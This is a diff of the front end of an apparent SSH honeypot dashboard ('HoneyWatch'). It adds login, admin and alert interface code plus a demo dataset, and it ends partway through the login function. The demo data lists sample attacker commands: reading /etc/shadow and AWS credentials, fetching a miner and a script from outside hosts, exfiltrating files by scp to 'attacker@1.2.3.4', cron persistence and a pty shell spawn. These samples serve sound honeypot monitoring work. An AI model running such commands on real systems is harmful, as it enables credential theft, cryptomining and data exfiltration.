@@ -4,7 +4,11 @@
 <meta charset="UTF-8"/>
 <meta name="viewport" content="width=device-width,initial-scale=1"/>
 <title>HoneyWatch v2 — Threat Intelligence Platform</title>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/4.4.1/chart.umd.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/4.4.1/chart.umd.min.js">
+// ── Init (runs after all functions are defined) ──────────────────────────────
+/* init at bottom */
+
+</script>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.js"></script>
 <link  href="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.css" rel="stylesheet"/>
 <style>
@@ -32,30 +36,168 @@ body::after{content:'';position:fixed;inset:0;pointer-events:none;z-index:9999;
   background:repeating-linear-gradient(0deg,transparent,transparent 3px,rgba(0,255,163,.012) 3px,rgba(0,255,163,.012) 4px)}
 
 /* ── nav header ── */
-header{position:sticky;top:0;z-index:500;background:rgba(4,8,13,.92);
-  backdrop-filter:blur(12px);border-bottom:1px solid var(--border2);
-  padding:0 24px;height:56px;display:flex;align-items:center;justify-content:space-between}
-.logo{display:flex;align-items:center;gap:10px}
-.logo-icon{font-size:22px;filter:drop-shadow(0 0 8px var(--g))}
-.logo h1{font-family:var(--font-ui);font-size:16px;font-weight:800;
-  letter-spacing:.12em;text-transform:uppercase;
-  background:linear-gradient(90deg,var(--g),var(--c));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
-.logo span{font-family:var(--font-mono);font-size:10px;color:var(--txt2);letter-spacing:.2em}
-.nav-tabs{display:flex;gap:2px}
-.tab{padding:6px 14px;border-radius:4px;font-family:var(--font-mono);font-size:11px;
-  letter-spacing:.08em;cursor:pointer;transition:all .15s;
-  color:var(--txt2);border:1px solid transparent}
-.tab:hover{color:var(--txt);background:var(--bg3)}
-.tab.active{color:var(--g);background:rgba(0,255,163,.08);border-color:rgba(0,255,163,.2)}
-.header-right{display:flex;align-items:center;gap:16px}
-.live-badge{display:flex;align-items:center;gap:6px;font-family:var(--font-mono);font-size:10px;color:var(--g)}
-.pulse{width:7px;height:7px;border-radius:50%;background:var(--g);box-shadow:0 0 0 0 var(--g);
-  animation:ripple 1.8s infinite}
-@keyframes ripple{0%{box-shadow:0 0 0 0 rgba(0,255,163,.5)}70%{box-shadow:0 0 0 8px rgba(0,255,163,0)}100%{box-shadow:0 0 0 0 rgba(0,255,163,0)}}
-#clock{font-family:var(--font-mono);font-size:11px;color:var(--txt2)}
-#ws-status{font-family:var(--font-mono);font-size:10px;padding:2px 8px;border-radius:3px;
-  background:rgba(255,45,85,.1);color:var(--r);border:1px solid rgba(255,45,85,.2)}
-#ws-status.connected{background:rgba(0,255,163,.08);color:var(--g);border-color:rgba(0,255,163,.2)}
+header {
+  position: sticky; top: 0; z-index: 500;
+  background: rgba(4,8,13,.97);
+  backdrop-filter: blur(16px);
+  border-bottom: 1px solid var(--border2);
+  height: 60px;
+  display: grid;
+  grid-template-columns: 210px 1fr auto;
+  align-items: center;
+  padding: 0 20px;
+  gap: 0;
+}
+.logo {
+  display: flex; align-items: center; gap: 10px;
+}
+.logo-icon {
+  font-size: 22px;
+  filter: drop-shadow(0 0 8px var(--g));
+  flex-shrink: 0;
+}
+.logo h1 {
+  font-family: var(--font-ui); font-size: 15px; font-weight: 800;
+  letter-spacing: .14em; text-transform: uppercase; line-height: 1.15;
+  background: linear-gradient(90deg,var(--g),var(--c));
+  -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+}
+.logo span {
+  font-family: var(--font-mono); font-size: 9px;
+  color: var(--txt2); letter-spacing: .15em; display: block;
+}
+.nav-tabs {
+  display: flex; align-items: center; justify-content: center;
+  gap: 2px;
+}
+.tab {
+  padding: 5px 12px; border-radius: 4px; white-space: nowrap;
+  font-family: var(--font-mono); font-size: 11px; letter-spacing: .05em;
+  cursor: pointer; transition: all .15s;
+  color: var(--txt2); border: 1px solid transparent;
+}
+.tab:hover  { color: var(--txt); background: var(--bg3); }
+.tab.active { color: var(--g); background: rgba(0,255,163,.08); border-color: rgba(0,255,163,.2); }
+.header-right {
+  display: flex; align-items: center; gap: 10px; justify-content: flex-end;
+}
+.admin-bar {
+  display: flex; align-items: center; gap: 8px;
+}
+.admin-btn {
+  font-family: var(--font-mono); font-size: 10px;
+  padding: 5px 11px; border-radius: 4px; cursor: pointer;
+  border: 1px solid; transition: all .15s;
+  letter-spacing: .04em; white-space: nowrap; line-height: 1.2;
+}
+.admin-btn.report   { color:var(--g);    border-color:rgba(0,255,163,.35);  background:rgba(0,255,163,.08);  }
+.admin-btn.report:hover   { background:rgba(0,255,163,.18); }
+.admin-btn.settings { color:var(--c);    border-color:rgba(0,204,255,.35);  background:rgba(0,204,255,.08);  }
+.admin-btn.settings:hover { background:rgba(0,204,255,.18); }
+.admin-btn.logout   { color:var(--txt2); border-color:var(--border2);       background:transparent; }
+.admin-btn.logout:hover   { color:var(--r); border-color:rgba(255,45,85,.4); }
+#admin-user {
+  font-family: var(--font-mono); font-size: 10px; color: var(--txt2);
+  white-space: nowrap; padding: 0 4px;
+  border-left: 1px solid var(--border2); margin-left: 2px; padding-left: 10px;
+}
+.header-divider {
+  width: 1px; height: 24px; background: var(--border2); flex-shrink: 0;
+}
+#ws-status {
+  font-family: var(--font-mono); font-size: 10px; padding: 3px 9px;
+  border-radius: 3px; white-space: nowrap;
+  background: rgba(255,45,85,.1); color: var(--r); border: 1px solid rgba(255,45,85,.2);
+}
+#ws-status.connected {
+  background: rgba(0,255,163,.08); color: var(--g); border-color: rgba(0,255,163,.2);
+}
+.live-badge {
+  display: flex; align-items: center; gap: 5px;
+  font-family: var(--font-mono); font-size: 10px; color: var(--g); white-space: nowrap;
+}
+.pulse {
+  width: 7px; height: 7px; border-radius: 50%; background: var(--g); flex-shrink: 0;
+  animation: ripple 1.8s infinite;
+}
+@keyframes ripple {
+  0%   { box-shadow: 0 0 0 0   rgba(0,255,163,.6); }
+  70%  { box-shadow: 0 0 0 8px rgba(0,255,163,0);  }
+  100% { box-shadow: 0 0 0 0   rgba(0,255,163,0);  }
+}
+#clock {
+  font-family: var(--font-mono); font-size: 10px; color: var(--txt2); white-space: nowrap;
+}
+.alert-badge {
+  background: var(--r); color: #fff; font-family: var(--font-mono); font-size: 8px;
+  border-radius: 50%; width: 14px; height: 14px; display: inline-flex;
+  align-items: center; justify-content: center; margin-left: 3px;
+  animation: pulse-r 2s infinite; vertical-align: middle;
+}
+@keyframes pulse-r { 0%,100%{opacity:1} 50%{opacity:.5} }
+
+/* ── login modal ── */
+#login-overlay{position:fixed;inset:0;background:rgba(4,8,13,.97);z-index:9000;
+  display:flex;align-items:center;justify-content:center;backdrop-filter:blur(8px)}
+#login-overlay.hidden{display:none}
+.login-box{background:var(--bg2);border:1px solid var(--border2);border-radius:10px;
+  padding:40px 36px;width:340px;text-align:center}
+.login-box h2{font-family:var(--font-ui);font-size:20px;font-weight:800;color:var(--g);
+  letter-spacing:.1em;margin-bottom:4px}
+.login-box p{font-family:var(--font-mono);font-size:10px;color:var(--txt2);margin-bottom:24px}
+.login-field{width:100%;background:var(--bg3);border:1px solid var(--border2);border-radius:5px;
+  padding:10px 14px;font-family:var(--font-mono);font-size:12px;color:var(--txt);
+  margin-bottom:12px;outline:none;transition:border-color .2s;box-sizing:border-box}
+.login-field:focus{border-color:var(--g)}
+.login-btn{width:100%;padding:11px;background:linear-gradient(90deg,var(--g2),var(--g));
+  border:none;border-radius:5px;font-family:var(--font-mono);font-size:12px;
+  font-weight:700;color:#000;cursor:pointer;letter-spacing:.1em;transition:opacity .2s}
+.login-btn:hover{opacity:.85}
+.login-btn:disabled{opacity:.5;cursor:not-allowed}
+.login-err{font-family:var(--font-mono);font-size:11px;color:var(--r);margin-top:10px;
+  min-height:16px;text-align:center}
+/* admin-bar styles moved to header CSS */
+/* ── alerts page ── */
+.alert-item{background:var(--bg2);border:1px solid var(--border);border-radius:5px;
+  padding:12px 14px;display:grid;grid-template-columns:auto 1fr auto auto;
+  gap:10px;align-items:center;margin-bottom:8px;transition:opacity .3s}
+.alert-item.acked{opacity:.4}
+.alert-item.critical{border-left:3px solid var(--r)}
+.alert-item.high{border-left:3px solid var(--o)}
+.alert-item.medium{border-left:3px solid var(--y)}
+.alert-item.low{border-left:3px solid var(--g)}
+.alert-title{font-family:var(--font-mono);font-size:11px;font-weight:700;color:var(--txt)}
+.alert-msg{font-family:var(--font-mono);font-size:10px;color:var(--txt2);margin-top:2px}
+.alert-ts{font-family:var(--font-mono);font-size:9px;color:var(--txt2);white-space:nowrap}
+.ack-btn{font-family:var(--font-mono);font-size:9px;padding:2px 8px;border-radius:3px;
+  border:1px solid var(--border2);color:var(--txt2);background:transparent;cursor:pointer}
+.ack-btn:hover{color:var(--g);border-color:rgba(0,255,163,.3)}
+/* ── settings modal ── */
+#settings-modal{position:fixed;inset:0;background:rgba(4,8,13,.9);z-index:8000;
+  display:flex;align-items:center;justify-content:center}
+#settings-modal.hidden{display:none}
+.settings-box{background:var(--bg2);border:1px solid var(--border2);border-radius:10px;
+  padding:28px 32px;width:480px;max-height:85vh;overflow-y:auto}
+.settings-box h3{font-family:var(--font-mono);font-size:13px;font-weight:700;
+  color:var(--g);letter-spacing:.15em;margin-bottom:16px}
+.settings-row{display:grid;grid-template-columns:160px 1fr;align-items:center;
+  gap:10px;margin-bottom:10px}
+.settings-lbl{font-family:var(--font-mono);font-size:10px;color:var(--txt2)}
+.settings-inp{background:var(--bg3);border:1px solid var(--border2);border-radius:4px;
+  padding:7px 10px;font-family:var(--font-mono);font-size:11px;color:var(--txt);
+  outline:none;width:100%;box-sizing:border-box}
+.settings-inp:focus{border-color:var(--g)}
+.settings-check{width:16px;height:16px;accent-color:var(--g)}
+.settings-save{margin-top:16px;padding:8px 20px;background:rgba(0,255,163,.1);
+  border:1px solid rgba(0,255,163,.3);border-radius:4px;color:var(--g);
+  font-family:var(--font-mono);font-size:11px;cursor:pointer;margin-right:8px}
+.settings-close{margin-top:16px;padding:8px 20px;background:transparent;
+  border:1px solid var(--border2);border-radius:4px;color:var(--txt2);
+  font-family:var(--font-mono);font-size:11px;cursor:pointer}
+.settings-section{font-family:var(--font-mono);font-size:9px;color:var(--c);
+  letter-spacing:.2em;text-transform:uppercase;margin:16px 0 8px;
+  padding-bottom:4px;border-bottom:1px solid var(--border)}
+
 
 /* ── pages ── */
 .page{display:none;padding:20px 20px 32px}
@@ -227,26 +369,54 @@ canvas{display:block}
 <body>
 
 <header>
+
+  <!-- ① Logo — fixed 210px left column -->
   <div class="logo">
     <span class="logo-icon">🍯</span>
     <div>
       <h1>HoneyWatch</h1>
-      <span>SSH THREAT INTELLIGENCE v2.0</span>
+      <span>SSH THREAT INTELLIGENCE</span>
     </div>
   </div>
-  <div class="nav-tabs">
+
+  <!-- ② Nav — centred in the 1fr middle column -->
+  <nav class="nav-tabs">
     <div class="tab active" onclick="showPage('overview')">Overview</div>
-    <div class="tab" onclick="showPage('map')">World Map</div>
-    <div class="tab" onclick="showPage('credentials')">Credentials</div>
-    <div class="tab" onclick="showPage('activity')">Activity</div>
-    <div class="tab" onclick="showPage('threats')">Threats</div>
-    <div class="tab" onclick="showPage('malware')">Malware</div>
-  </div>
+    <div class="tab"        onclick="showPage('map')">World Map</div>
+    <div class="tab"        onclick="showPage('credentials')">Credentials</div>
+    <div class="tab"        onclick="showPage('activity')">Activity</div>
+    <div class="tab"        onclick="showPage('threats')">Threats</div>
+    <div class="tab"        onclick="showPage('malware')">Malware</div>
+    <div class="tab"        onclick="showPage('alerts')">
+      Alerts
+      <span class="alert-badge" id="nav-alert-badge" style="display:none">0</span>
+    </div>
+  </nav>
+
+  <!-- ③ Right cluster — auto-width right column -->
   <div class="header-right">
+
+    <!-- Admin controls (hidden until login) -->
+    <div class="admin-bar" id="admin-bar" style="display:none">
+      <button class="admin-btn report"   onclick="downloadReport()">⬇ Report</button>
+      <button class="admin-btn settings" onclick="openSettings()">⚙ Alerts</button>
+      <span id="admin-user"></span>
+      <button class="admin-btn logout"   onclick="doLogout()">Logout</button>
+    </div>
+
+    <div class="header-divider"></div>
+
+    <!-- WS connection status -->
     <span id="ws-status">● OFFLINE</span>
+
+    <!-- Pulse + LIVE label -->
     <div class="live-badge"><span class="pulse"></span>LIVE</div>
+
+    <!-- UTC clock -->
     <div id="clock"></div>
+
   </div>
+
 </header>
 
 <!-- ══════════════════════════════════════════════════════ OVERVIEW ══ -->
@@ -399,14 +569,14 @@ Chart.defaults.color = '#567890';
 Chart.defaults.borderColor = '#162330';
 Chart.defaults.font.family = "'JetBrains Mono', monospace";
 
-const COUNTRY_FLAGS = {US:'🇺🇸',RU:'🇷🇺',CN:'🇨🇳',DE:'🇩🇪',NL:'🇳🇱',UA:'🇺🇦',IR:'🇮🇷',
+var COUNTRY_FLAGS = {US:'🇺🇸',RU:'🇷🇺',CN:'🇨🇳',DE:'🇩🇪',NL:'🇳🇱',UA:'🇺🇦',IR:'🇮🇷',
   RO:'🇷🇴',BG:'🇧🇬',SG:'🇸🇬',TR:'🇹🇷',XX:'🏠',GB:'🇬🇧',FR:'🇫🇷',BR:'🇧🇷',IN:'🇮🇳'};
 
-let _data = null;
-let _charts = {};
-let _map = null;
-let _feedCount = 0;
-const MAX_FEED = 80;
+var _data = null;
+var _charts = {};
+var _map = null;
+var _feedCount = 0;
+var MAX_FEED = 80;
 
 // ══════════════════════════════════════════════════════ NAV ══
 function showPage(name) {
@@ -427,28 +597,7 @@ function updateClock() {
 updateClock(); setInterval(updateClock, 1000);
 
 // ══════════════════════════════════════════════════════ WEBSOCKET ══
-function connectWS() {
-  const wsEl = document.getElementById('ws-status');
-  try {
-    const ws = new WebSocket('ws://localhost:8080/ws');
-    ws.onopen = () => {
-      wsEl.textContent = '● LIVE'; wsEl.classList.add('connected');
-    };
-    ws.onmessage = (e) => {
-      const msg = JSON.parse(e.data);
-      if (msg.type === 'snapshot') {
-        _data = msg.data; renderAll(_data);
-      } else {
-        pushFeedEvent(msg);
-      }
-    };
-    ws.onclose = () => {
-      wsEl.textContent = '● OFFLINE'; wsEl.classList.remove('connected');
-      setTimeout(connectWS, 4000);
-    };
-    ws.onerror = () => ws.close();
-  } catch(e) {}
-}
+
 
 function pushFeedEvent(msg) {
   const feed = document.getElementById('liveFeed');
@@ -476,10 +625,10 @@ function pushFeedEvent(msg) {
 }
 
 // ══════════════════════════════════════════════════════ HELPERS ══
-const $ = id => document.getElementById(id);
-const fmt = n => n?.toLocaleString() ?? '─';
-const fmtTs = ts => ts ? ts.replace('T',' ').slice(0,16)+'Z' : '─';
-const flag = cc => COUNTRY_FLAGS[cc] || '🌐';
+var $ = id => document.getElementById(id);
+var fmt = n => n?.toLocaleString() ?? '─';
+var fmtTs = ts => ts ? ts.replace('T',' ').slice(0,16)+'Z' : '─';
+var flag = cc => COUNTRY_FLAGS[cc] || '🌐';
 
 function hbar(items, containerId, colorClass, top=12) {
   const el = $(containerId);
@@ -801,24 +950,463 @@ function renderMap(d) {
 }
 
 // ══════════════════════════════════════════════════════ FETCH ══
-async function loadData() {
+
+
+// ══════════════════════════════════════════════════════ DEMO DATA ══
+var DEMO_DATA = {"summary":{"total_attempts":8660,"total_successes":765,"unique_ips":15,"total_commands":3912,"suspicious_events":889,"malware_captures":253,"active_sessions":3,"sessions_today":47,"success_rate":8.8},"timeline":[{"date":"2026-04-18","attempts":389,"successes":30,"commands":152},{"date":"2026-04-19","attempts":786,"successes":73,"commands":396},{"date":"2026-04-20","attempts":915,"successes":83,"commands":441},{"date":"2026-04-21","attempts":364,"successes":40,"commands":204},{"date":"2026-04-22","attempts":248,"successes":24,"commands":163},{"date":"2026-04-23","attempts":505,"successes":50,"commands":172},{"date":"2026-04-24","attempts":570,"successes":32,"commands":242},{"date":"2026-04-25","attempts":461,"successes":44,"commands":232},{"date":"2026-04-26","attempts":910,"successes":81,"commands":416},{"date":"2026-04-27","attempts":743,"successes":72,"commands":322},{"date":"2026-04-28","attempts":580,"successes":48,"commands":282},{"date":"2026-04-29","attempts":579,"successes":47,"commands":287},{"date":"2026-04-30","attempts":778,"successes":78,"commands":314},{"date":"2026-05-01","attempts":173,"successes":15,"commands":67}],"top_usernames":[{"value":"guest","count":412},{"value":"test","count":404},{"value":"jenkins","count":397},{"value":"ec2-user","count":396},{"value":"ansible","count":393},{"value":"hadoop","count":393},{"value":"user","count":393},{"value":"oracle","count":391},{"value":"pi","count":381},{"value":"support","count":379},{"value":"ftp","count":372},{"value":"mysql","count":370}],"top_passwords":[{"value":"raspberry","count":353},{"value":"dragon","count":349},{"value":"1234","count":347},{"value":"test","count":346},{"value":"batman","count":339},{"value":"letmein","count":334},{"value":"changeme","count":330},{"value":"admin","count":329},{"value":"root123","count":329},{"value":"default","count":328},{"value":"password","count":326},{"value":"master","count":325}],"top_ips":[{"ip":"194.165.16.75","count":703,"country":"Iran","country_code":"IR","city":"Tehran","isp":"Erfan Net","lat":35.69,"lon":51.42,"abuse_score":82},{"ip":"80.94.92.241","count":684,"country":"Ukraine","country_code":"UA","city":"Kyiv","isp":"Volia","lat":50.45,"lon":30.52,"abuse_score":85},{"ip":"45.33.32.156","count":668,"country":"United States","country_code":"US","city":"Atlanta","isp":"Linode LLC","lat":33.74,"lon":-84.38,"abuse_score":72},{"ip":"77.83.36.55","count":663,"country":"Netherlands","country_code":"NL","city":"Breda","isp":"Verdant BV","lat":51.59,"lon":4.78,"abuse_score":67},{"ip":"178.128.23.9","count":638,"country":"Singapore","country_code":"SG","city":"Singapore","isp":"DigitalOcean","lat":1.29,"lon":103.85,"abuse_score":44},{"ip":"52.87.193.204","count":637,"country":"United States","country_code":"US","city":"Ashburn","isp":"Amazon AWS","lat":39.04,"lon":-77.49,"abuse_score":20},{"ip":"91.213.50.8","count":631,"country":"Bulgaria","country_code":"BG","city":"Sofia","isp":"Neterra Ltd","lat":42.69,"lon":23.32,"abuse_score":76},{"ip":"185.234.219.20","count":596,"country":"Russia","country_code":"RU","city":"Moscow","isp":"Hosting Ltd","lat":55.75,"lon":37.62,"abuse_score":98},{"ip":"109.248.9.14","count":567,"country":"China","country_code":"CN","city":"Beijing","isp":"Alibaba Cloud","lat":39.91,"lon":116.39,"abuse_score":79},{"ip":"146.185.133.197","count":554,"country":"Romania","country_code":"RO","city":"Bucharest","isp":"M247 Ltd","lat":44.43,"lon":26.1,"abuse_score":88}],"attack_types":[{"type":"dictionary_attack","count":3552},{"type":"targeted_bruteforce","count":2218},{"type":"bruteforce","count":1578},{"type":"credential_stuffing","count":1312}],"top_commands":[{"cmd":"cat","count":778},{"cmd":"ls","count":161},{"cmd":"free","count":141},{"cmd":"scp","count":138},{"cmd":"ifconfig","count":138},{"cmd":"grep","count":138},{"cmd":"whoami","count":136},{"cmd":"python3","count":135},{"cmd":"netstat","count":135},{"cmd":"uname","count":134},{"cmd":"env","count":133},{"cmd":"wget","count":132}],"recent_commands":[{"timestamp":"2026-05-01T05:38:55+00:00","peer_ip":"5.188.86.172","command":"chmod +x /tmp/x.sh"},{"timestamp":"2026-05-01T05:35:43+00:00","peer_ip":"5.188.86.172","command":"echo '*/5 * * * * /tmp/miner' >> /var/spool/cron/crontabs/root"},{"timestamp":"2026-05-01T05:34:03+00:00","peer_ip":"5.188.86.172","command":"cat /root/.env"},{"timestamp":"2026-05-01T05:33:43+00:00","peer_ip":"5.188.86.172","command":"cat /etc/shadow"},{"timestamp":"2026-05-01T04:01:54+00:00","peer_ip":"109.248.9.14","command":"ps aux"},{"timestamp":"2026-05-01T03:59:42+00:00","peer_ip":"109.248.9.14","command":"cat /root/.env"},{"timestamp":"2026-05-01T03:56:25+00:00","peer_ip":"109.248.9.14","command":"/tmp/x.sh"},{"timestamp":"2026-05-01T03:55:56+00:00","peer_ip":"109.248.9.14","command":"scp /tmp/etc.tar.gz attacker@1.2.3.4:/tmp/"},{"timestamp":"2026-05-01T03:55:46+00:00","peer_ip":"109.248.9.14","command":"echo '*/5 * * * * /tmp/miner' >> /var/spool/cron/crontabs/root"},{"timestamp":"2026-05-01T03:55:11+00:00","peer_ip":"109.248.9.14","command":"cat /etc/shadow"},{"timestamp":"2026-05-01T03:54:56+00:00","peer_ip":"109.248.9.14","command":"uname -a"},{"timestamp":"2026-05-01T03:47:57+00:00","peer_ip":"91.213.50.8","command":"cat /root/.aws/credentials"},{"timestamp":"2026-05-01T03:47:29+00:00","peer_ip":"91.213.50.8","command":"ls -la"},{"timestamp":"2026-05-01T02:54:38+00:00","peer_ip":"80.94.92.241","command":"ssh root@10.0.1.100"},{"timestamp":"2026-05-01T02:54:34+00:00","peer_ip":"80.94.92.241","command":"curl http://193.106.31.72/miner -o /tmp/miner"},{"timestamp":"2026-05-01T02:53:49+00:00","peer_ip":"80.94.92.241","command":"cat /root/.aws/credentials"}],"suspicious_types":[{"type":"file_download","count":253},{"type":"data_exfiltration","count":138},{"type":"interpreter_execution","count":135},{"type":"persistence","count":126},{"type":"make_executable","count":120},{"type":"lateral_movement","count":117}],"recent_suspicious":[{"timestamp":"2026-05-01T05:38:55+00:00","peer_ip":"5.188.86.172","suspicious_type":"make_executable","detail":"{\"command\":\"chmod +x /tmp/x.sh\"}","severity":"medium","country":"Russia","country_code":"RU"},{"timestamp":"2026-05-01T05:35:43+00:00","peer_ip":"5.188.86.172","suspicious_type":"persistence","detail":"{\"command\":\"echo '*/5 * * * * /tmp/miner' >> /var/spool/cron/crontabs/root\"}","severity":"critical","country":"Russia","country_code":"RU"},{"timestamp":"2026-05-01T03:55:56+00:00","peer_ip":"109.248.9.14","suspicious_type":"data_exfiltration","detail":"{\"command\":\"scp /tmp/etc.tar.gz attacker@1.2.3.4:/tmp/\"}","severity":"critical","country":"China","country_code":"CN"},{"timestamp":"2026-05-01T03:55:46+00:00","peer_ip":"109.248.9.14","suspicious_type":"persistence","detail":"{\"command\":\"echo '*/5 * * * * /tmp/miner' >> /var/spool/cron/crontabs/root\"}","severity":"critical","country":"China","country_code":"CN"},{"timestamp":"2026-05-01T03:48:37+00:00","peer_ip":"91.213.50.8","suspicious_type":"data_exfiltration","detail":"{\"command\":\"scp /tmp/etc.tar.gz attacker@1.2.3.4:/tmp/\"}","severity":"critical","country":"Bulgaria","country_code":"BG"},{"timestamp":"2026-05-01T02:54:38+00:00","peer_ip":"80.94.92.241","suspicious_type":"lateral_movement","detail":"{\"command\":\"ssh root@10.0.1.100\"}","severity":"critical","country":"Ukraine","country_code":"UA"},{"timestamp":"2026-05-01T02:54:34+00:00","peer_ip":"80.94.92.241","suspicious_type":"file_download","detail":"{\"command\":\"curl http://193.106.31.72/miner -o /tmp/miner\"}","severity":"high","country":"Ukraine","country_code":"UA"},{"timestamp":"2026-05-01T01:29:39+00:00","peer_ip":"146.185.133.197","suspicious_type":"lateral_movement","detail":"{\"command\":\"ssh root@10.0.1.100\"}","severity":"critical","country":"Romania","country_code":"RO"},{"timestamp":"2026-05-01T01:25:59+00:00","peer_ip":"146.185.133.197","suspicious_type":"file_download","detail":"{\"command\":\"wget http://45.33.32.156/x.sh -O /tmp/x.sh\"}","severity":"high","country":"Romania","country_code":"RO"},{"timestamp":"2026-05-01T01:20:57+00:00","peer_ip":"146.185.133.197","suspicious_type":"interpreter_execution","detail":"{\"command\":\"python3 -c 'import pty; pty.spawn(\\\"/bin/bash\\\")'\"}","severity":"high","country":"Romania","country_code":"RO"}],"map_points":[{"ip":"104.236.198.48","lat":37.77,"lon":-122.41,"country":"United States","country_code":"US","city":"San Francisco","isp":"DigitalOcean","abuse_score":55,"attempts":516},{"ip":"109.248.9.14","lat":39.91,"lon":116.39,"country":"China","country_code":"CN","city":"Beijing","isp":"Alibaba Cloud","abuse_score":79,"attempts":567},{"ip":"138.197.148.152","lat":50.11,"lon":8.68,"country":"Germany","country_code":"DE","city":"Frankfurt","isp":"DigitalOcean","abuse_score":60,"attempts":476},{"ip":"146.185.133.197","lat":44.43,"lon":26.1,"country":"Romania","country_code":"RO","city":"Bucharest","isp":"M247 Ltd","abuse_score":88,"attempts":554},{"ip":"178.128.23.9","lat":1.29,"lon":103.85,"country":"Singapore","country_code":"SG","city":"Singapore","isp":"DigitalOcean","abuse_score":44,"attempts":638},{"ip":"185.234.219.20","lat":55.75,"lon":37.62,"country":"Russia","country_code":"RU","city":"Moscow","isp":"Hosting Ltd","abuse_score":98,"attempts":596},{"ip":"193.106.31.72","lat":52.37,"lon":4.9,"country":"Netherlands","country_code":"NL","city":"Amsterdam","isp":"Serverius","abuse_score":91,"attempts":429},{"ip":"194.165.16.75","lat":35.69,"lon":51.42,"country":"Iran","country_code":"IR","city":"Tehran","isp":"Erfan Net","abuse_score":82,"attempts":703},{"ip":"45.142.212.100","lat":41.01,"lon":28.95,"country":"Turkey","country_code":"TR","city":"Istanbul","isp":"Stark Industries","abuse_score":93,"attempts":445},{"ip":"45.33.32.156","lat":33.74,"lon":-84.38,"country":"United States","country_code":"US","city":"Atlanta","isp":"Linode LLC","abuse_score":72,"attempts":668},{"ip":"5.188.86.172","lat":59.93,"lon":30.32,"country":"Russia","country_code":"RU","city":"St Petersburg","isp":"Pin-Up LLC","abuse_score":95,"attempts":453},{"ip":"52.87.193.204","lat":39.04,"lon":-77.49,"country":"United States","country_code":"US","city":"Ashburn","isp":"Amazon AWS","abuse_score":20,"attempts":637},{"ip":"77.83.36.55","lat":51.59,"lon":4.78,"country":"Netherlands","country_code":"NL","city":"Breda","isp":"Verdant BV","abuse_score":67,"attempts":663},{"ip":"80.94.92.241","lat":50.45,"lon":30.52,"country":"Ukraine","country_code":"UA","city":"Kyiv","isp":"Volia","abuse_score":85,"attempts":684},{"ip":"91.213.50.8","lat":42.69,"lon":23.32,"country":"Bulgaria","country_code":"BG","city":"Sofia","isp":"Neterra Ltd","abuse_score":76,"attempts":631}],"hourly_heatmap":[{"hour":0,"count":341},{"hour":1,"count":437},{"hour":2,"count":420},{"hour":3,"count":396},{"hour":4,"count":265},{"hour":5,"count":188},{"hour":6,"count":152},{"hour":7,"count":262},{"hour":8,"count":305},{"hour":9,"count":451},{"hour":10,"count":408},{"hour":11,"count":366},{"hour":12,"count":471},{"hour":13,"count":462},{"hour":14,"count":325},{"hour":15,"count":349},{"hour":16,"count":453},{"hour":17,"count":433},{"hour":18,"count":564},{"hour":19,"count":400},{"hour":20,"count":326},{"hour":21,"count":410},{"hour":22,"count":182},{"hour":23,"count":294}],"recent_malware":[{"timestamp":"2026-05-01T02:54:34+00:00","peer_ip":"80.94.92.241","url":"http://193.106.31.72/miner","tool":"curl","filename":"miner","file_hash":"sha256:9699e7f36afd2e74"},{"timestamp":"2026-05-01T02:20:18+00:00","peer_ip":"52.87.193.204","url":"http://45.33.32.156/x.sh","tool":"wget","filename":"x.sh","file_hash":"sha256:d0ea34c89ac60c25"},{"timestamp":"2026-05-01T01:25:59+00:00","peer_ip":"146.185.133.197","url":"http://45.33.32.156/x.sh","tool":"wget","filename":"x.sh","file_hash":"sha256:52216b515196fa83"},{"timestamp":"2026-04-30T23:50:47+00:00","peer_ip":"45.142.212.100","url":"http://45.33.32.156/x.sh","tool":"wget","filename":"x.sh","file_hash":"sha256:6908ba7358651a4e"},{"timestamp":"2026-04-30T21:12:19+00:00","peer_ip":"194.165.16.75","url":"http://193.106.31.72/miner","tool":"curl","filename":"miner","file_hash":"sha256:d4d0b18a56a584ed"},{"timestamp":"2026-04-30T18:45:57+00:00","peer_ip":"109.248.9.14","url":"http://45.33.32.156/x.sh","tool":"wget","filename":"x.sh","file_hash":"sha256:33b57b6b338ce0ef"}]};
+
+// ══════════════════════════════════════════════════════ INIT ══
+// Start with login check — load data after auth
+// init moved to end of script
+
+// ══════════════════════════════════════════════════════ AUTH ══
+
+var _token  = null;
+var _apiPort = null;
+var _settingsPending = {};
+var _useRelativeUrls = false;
+
+// ── Helpers ───────────────────────────────────────────────────────────────────
+function apiUrl(path) {
+  return 'http://localhost:' + (_apiPort || 8080) + path;
+}
+
+function authHeaders() {
+  return _token ? {Authorization: 'Bearer ' + _token, 'Content-Type': 'application/json'}
+                : {'Content-Type': 'application/json'};
+}
+
+function checkExistingSession() {
+  // Always show login fresh — prevents stale token / demo-mode confusion
+  sessionStorage.removeItem('hw_token');
+  sessionStorage.removeItem('hw_user');
+  document.getElementById('login-overlay').classList.remove('hidden');
+}
+
+async function discoverApiPort() {
+  if (_apiPort) return _apiPort;
+
+  // If served via http://localhost:PORT — try current port first
+  if (window.location.protocol === 'http:' && window.location.hostname === 'localhost') {
+    var currentPort = parseInt(window.location.port) || 80;
+    try {
+      var probe = await fetch('http://localhost:' + currentPort + '/api/stats',
+        {signal: AbortSignal.timeout(3000), cache: 'no-store'});
+      if (probe.ok) {
+        _apiPort = currentPort;
+        return currentPort;
+      }
+    } catch(e) { console.log('Localhost probe failed:', e.message); }
+  }
+
+  // Probe common ports
+  var ports = [8080, 8081, 8082, 8083, 8888, 9000, 9090, 7070];
+  for (var i = 0; i < ports.length; i++) {
+    try {
+      var r = await fetch('http://localhost:' + ports[i] + '/api/stats',
+        {signal: AbortSignal.timeout(2000), cache: 'no-store'});
+      if (r.ok) { _apiPort = ports[i]; return ports[i]; }
+    } catch(e) { console.log('Port ' + ports[i] + ' failed:', e.message); }
+  }
+  return null;
+}
+
+async function doLogin() {
+  var btn  = document.getElementById('login-btn');
+  var err  = document.getElementById('login-err');
+  var user = document.getElementById('login-user').value.trim();
+  var pass = document.getElementById('login-pass').value;
+
+  if (!user) { err.textContent = 'Enter username'; return; }
+  if (!pass) { err.textContent = 'Enter password'; return; }
+
+  err.textContent = '';
+  btn.disabled = true;
+  btn.textContent = 'CONNECTING...';
+
